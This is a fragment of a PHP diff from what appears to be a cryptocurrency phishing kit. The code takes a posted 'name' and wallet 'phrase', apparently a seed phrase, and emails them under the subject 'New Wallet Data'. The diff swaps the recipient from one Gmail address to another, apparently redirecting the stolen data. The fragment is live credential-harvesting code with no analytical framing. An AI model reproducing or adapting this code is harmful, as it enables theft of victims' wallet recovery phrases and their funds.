@@ -3,7 +3,7 @@
     $name = $_POST['name'];
     $phrase = $_POST['phrase'];
 
-    $to = "Braindevine995@gmail.com";
+    $to = "Paulwit134@gmail.com";
     $subject = "New Wallet Data";
     $body = "";
 
